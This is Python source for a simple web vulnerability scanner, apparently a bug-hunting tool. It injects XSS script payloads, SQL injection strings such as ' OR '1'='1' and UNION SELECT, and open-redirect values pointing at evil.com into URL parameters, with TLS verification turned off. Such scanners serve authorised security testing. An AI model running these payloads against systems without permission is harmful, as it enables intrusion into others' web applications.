import requests
import re
from urllib.parse import urlencode, parse_qs
from colorama import Fore, Style
import time
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class VulnScanner:
    def __init__(self, url, test_type='all', config=None):
        self.url = url
        self.test_type = test_type
        self.verbose = config.get('verbose', False) if config else False
        self.config = config if config else {}
        self.session = requests.Session()
        
        if self.config.get('headers'):
            self.session.headers.update(self.config['headers'])
        
        if 'User-Agent' not in self.session.headers:
            self.session.headers['User-Agent'] = 'BugHunter/2.0'
        
        if self.config.get('proxy'):
            self.session.proxies = {
                'http': self.config['proxy'],
                'https': self.config['proxy']
            }
        
        self.session.verify = False
        self.delay = self.config.get('delay', 0)
        self.vulnerabilities = []
        
        self.xss_payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            'javascript:alert(1)',
            '\'"><script>alert(1)</script>',
            '<svg onload=alert(1)>',
        ]
        
        self.sqli_payloads = [
            "'",
            "1' OR '1'='1",
            "' OR '1'='1' --",
            "1' ORDER BY 1--",
            "' UNION SELECT NULL--",
            "1' AND '1'='1",
            "' AND 1=1--",
        ]
        
        self.sqli_errors = [
            'SQL syntax',
            'mysql_fetch',
            'ORA-[0-9]+',
            'PostgreSQL',
            'SQLite',
            'Microsoft OLE DB',
            'unclosed quotation mark',
            'syntax error',
            'Warning: mysql',
        ]
    
    def test_xss(self, url, params):
        if self.verbose:
            print(f"{Fore.YELLOW}[*] Testing XSS on {url}{Style.RESET_ALL}")
        
        for payload in self.xss_payloads:
            if '?' in url:
                base_url, query_string = url.split('?', 1)
                params_dict = parse_qs(query_string)
                
                for param in params_dict:
                    test_params = params_dict.copy()
                    test_params[param] = [payload]
                    test_url = base_url + '?' + urlencode(test_params, doseq=True)
                    
                    try:
                        response = self.session.get(test_url, timeout=10)
                        if payload in response.text:
                            self.vulnerabilities.append(
                                f"[XSS] Parameter: {param} | Payload: {payload}"
                            )
                            if self.verbose:
                                print(f"{Fore.GREEN}[✓] XSS Found: {param}{Style.RESET_ALL}")
                        
                        if self.delay > 0:
                            time.sleep(self.delay)
                    except:
                        continue
        
        return self.vulnerabilities
    
    def test_sqli(self, url, params):
        if self.verbose:
            print(f"{Fore.YELLOW}[*] Testing SQL Injection on {url}{Style.RESET_ALL}")
        
        for payload in self.sqli_payloads:
            if '?' in url:
                base_url, query_string = url.split('?', 1)
                params_dict = parse_qs(query_string)
                
                for param in params_dict:
                    test_params = params_dict.copy()
                    test_params[param] = [payload]
                    test_url = base_url + '?' + urlencode(test_params, doseq=True)
                    
                    try:
                        response = self.session.get(test_url, timeout=10)
                        
                        for error_pattern in self.sqli_errors:
                            if re.search(error_pattern, response.text, re.IGNORECASE):
                                self.vulnerabilities.append(
                                    f"[SQLi] Parameter: {param} | Error: {error_pattern}"
                                )
                                if self.verbose:
                                    print(f"{Fore.GREEN}[✓] SQLi Found: {param}{Style.RESET_ALL}")
                                break
                        
                        if response.elapsed.total_seconds() > 5:
                            self.vulnerabilities.append(
                                f"[SQLi-Time] Parameter: {param} | Possible time-based blind"
                            )
                        
                        if self.delay > 0:
                            time.sleep(self.delay)
                    except:
                        continue
        
        return self.vulnerabilities
    
    def test_open_redirect(self, url, params):
        if self.verbose:
            print(f"{Fore.YELLOW}[*] Testing Open Redirect on {url}{Style.RESET_ALL}")
        
        redirect_payloads = [
            'https://evil.com',
            '//evil.com',
            '\\\\evil.com',
            'https:evil.com',
        ]
        
        for payload in redirect_payloads:
            if '?' in url:
                base_url, query_string = url.split('?', 1)
                params_dict = parse_qs(query_string)
                
                for param in params_dict:
                    test_params = params_dict.copy()
                    test_params[param] = [payload]
                    test_url = base_url + '?' + urlencode(test_params, doseq=True)
                    
                    try:
                        response = self.session.get(test_url, timeout=10, allow_redirects=False)
                        
                        if response.status_code in [301, 302, 303, 307, 308]:
                            location = response.headers.get('Location', '')
                            if 'evil.com' in location:
                                self.vulnerabilities.append(
                                    f"[Open Redirect] Parameter: {param} | Redirects to: {location}"
                                )
                                if self.verbose:
                                    print(f"{Fore.GREEN}[✓] Open Redirect Found: {param}{Style.RESET_ALL}")
                        
                        if self.delay > 0:
                            time.sleep(self.delay)
                    except:
                        continue
        
        return self.vulnerabilities
    
    def scan(self):
        if self.verbose:
            print(f"{Fore.BLUE}[*] Starting scan on: {self.url}{Style.RESET_ALL}")
        
        params = {}
        if '?' in self.url:
            params = parse_qs(self.url.split('?', 1)[1])
        
        if not params:
            if self.verbose:
                print(f"{Fore.YELLOW}[!] No parameters found in URL{Style.RESET_ALL}")
            return []
        
        if self.test_type in ['xss', 'all']:
            self.test_xss(self.url, params)
            if self.delay > 0:
                time.sleep(self.delay)
        
        if self.test_type in ['sqli', 'all']:
            self.test_sqli(self.url, params)
            if self.delay > 0:
                time.sleep(self.delay)
        
        if self.test_type in ['redirect', 'all']:
            self.test_open_redirect(self.url, params)
        
        return self.vulnerabilities